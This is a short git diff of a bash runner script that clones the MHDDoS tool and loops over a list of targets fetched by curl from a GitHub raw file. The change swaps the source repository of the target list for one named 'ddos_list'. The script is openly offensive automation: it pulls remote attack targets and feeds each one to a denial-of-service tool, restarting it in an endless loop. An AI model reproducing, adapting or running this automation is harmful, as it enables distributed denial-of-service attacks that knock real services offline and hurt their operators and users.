@@ -113,10 +113,10 @@ git clone https://github.com/MHProDev/MHDDoS.git
 while true; do
 pkill -f start.py; pkill -f runner.py 
      # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
-    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+    list_size=$(curl -s https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst | cat | grep "^[^#]" | wc -l)
          while [[ $list_size = "0"  ]]; do
             sleep 5
-            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+            list_size=$(curl -s https://raw.githubusercontent.com/olamor/ddos_list/main/tcp_l4_all.lst | cat | grep "^[^#]" | wc -l)
       done
    for (( i=1; i<=list_size; i++ )); do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
